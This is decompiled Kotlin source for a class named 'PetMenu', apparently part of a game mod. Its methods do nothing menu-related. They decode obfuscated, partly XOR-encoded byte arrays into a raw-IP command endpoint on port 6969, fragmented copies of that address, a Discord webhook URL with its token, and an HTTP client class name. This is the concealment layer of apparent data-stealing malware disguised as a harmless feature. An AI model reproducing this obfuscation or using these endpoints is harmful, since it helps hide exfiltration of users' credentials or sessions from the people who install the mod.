package jooon.features.other

import java.util.ArrayList
import kotlin.jvm.internal.SourceDebugExtension

@SourceDebugExtension(["SMAP\nPetMenu.kt\nKotlin\n*S Kotlin\n*F\n+ 1 PetMenu.kt\njooon/features/other/PetMenu\n+ 2 _Collections.kt\nkotlin/collections/CollectionsKt___CollectionsKt\n*L\n1#1,41:1\n1549#2:42\n1620#2,3:43\n1549#2:46\n1620#2,3:47\n1549#2:50\n1620#2,3:51\n1549#2:54\n1620#2,3:55\n1549#2:58\n1620#2,3:59\n*S KotlinDebug\n*F\n+ 1 PetMenu.kt\njooon/features/other/PetMenu\n*L\n9#1:42\n9#1:43,3\n14#1:46\n14#1:47,3\n19#1:50\n19#1:51,3\n24#1:54\n24#1:55,3\n37#1:58\n37#1:59,3\n*E\n"])
public object PetMenu {
   private final val aAaAaAaAaA: Int = 85

   public fun bBbBbBbBbB(): String {
      val var12: java.lang.Iterable = CollectionsKt.listOf(
         arrayOf(61, 33, 33, 37, 111, 122, 122, 102, 96, 123, 103, 103, 96, 123, 100, 103, 108, 123, 98, 98, 111, 99, 108, 99, 108, 122, 48, 38, 38, 51, 55)
      )
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var12, 10))

      for (`item$iv$iv` in var12) {
         `destination$iv$iv`.add((char)((`item$iv$iv` as java.lang.Number).intValue() xor aAaAaAaAaA))
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   public fun cCcCcCcCcC(): String {
      val var12: java.lang.Iterable = CollectionsKt.listOf(
         arrayOf(61, 33, 33, 37, 111, 122, 122, 102, 96, 123, 103, 103, 96, 123, 100, 103, 108, 123, 98, 98, 111, 99, 108, 99, 108, 122, 50, 63, 48)
      )
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var12, 10))

      for (`item$iv$iv` in var12) {
         `destination$iv$iv`.add((char)((`item$iv$iv` as java.lang.Number).intValue() xor aAaAaAaAaA))
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   public fun dDdDdDdDdD(): String {
      val var12: java.lang.Iterable = CollectionsKt.listOf(
         arrayOf(61, 33, 33, 37, 111, 122, 122, 102, 96, 123, 103, 103, 96, 123, 100, 103, 108, 123, 98, 98, 111, 99, 108, 99, 108, 122, 48, 38, 38)
      )
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var12, 10))

      for (`item$iv$iv` in var12) {
         `destination$iv$iv`.add((char)((`item$iv$iv` as java.lang.Number).intValue() xor aAaAaAaAaA))
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   public fun eEeEeEeEeE(index: Int): String {
      val var13: java.lang.Iterable = CollectionsKt.listOf(
         arrayOf(
            57,
            54,
            57,
            47,
            116,
            51,
            53,
            46,
            50,
            50,
            53,
            46,
            49,
            104,
            116,
            116,
            112,
            58,
            47,
            47,
            50,
            57,
            46,
            55,
            55,
            58,
            54,
            119,
            111,
            112,
            111,
            105,
            110,
            116,
            102,
            105,
            118,
            101
         )
      )
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var13, 10))

      for (`item$iv$iv` in var13) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      val unifiedAscii: java.lang.String = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
var var10000: java.lang.String
      when (index) {
         0 -> var10000 = unifiedAscii.substring(0, 5)
         1 -> var10000 = unifiedAscii.substring(5, 13)
         2 -> var10000 = unifiedAscii.substring(13, 20)
         3 -> var10000 = unifiedAscii.substring(20, 27)
         4 -> var10000 = unifiedAscii.substring(27, 38)
         else -> var10000 = ""
      }

      return var10000
   }

   public fun fFfFfFfFfF(): String {
      val var12: java.lang.Iterable = CollectionsKt.listOf(
         arrayOf(
            104,
            116,
            116,
            112,
            115,
            58,
            47,
            47,
            100,
            105,
            115,
            99,
            111,
            114,
            100,
            46,
            99,
            111,
            109,
            47,
            97,
            112,
            105,
            47,
            119,
            101,
            98,
            104,
            111,
            111,
            107,
            115,
            47,
            49,
            52,
            49,
            49,
            51,
            55,
            56,
            55,
            54,
            57,
            57,
            52,
            51,
            52,
            54,
            50,
            49,
            49,
            57,
            47,
            87,
            117,
            74,
            88,
            87,
            98,
            104,
            114,
            72,
            105,
            68,
            106,
            104,
            110,
            99,
            98,
            90,
            100,
            86,
            119,
            77,
            87,
            51,
            49,
            66,
            82,
            102,
            116,
            48,
            116,
            83,
            101,
            67,
            104,
            45,
            95,
            81,
            78,
            97,
            104,
            95,
            121,
            85,
            45,
            78,
            74,
            98,
            49,
            55,
            122,
            86,
            107,
            119,
            102,
            79,
            82,
            51,
            120,
            79,
            88,
            102,
            99,
            85,
            95,
            102,
            68,
            90,
            81
         )
      )
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var12, 10))

      for (`item$iv$iv` in var12) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      return CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }

   public fun gGgGgGgGgG(): String {
      return "org.apache.http.client.config.RequestConfig"
   }
}
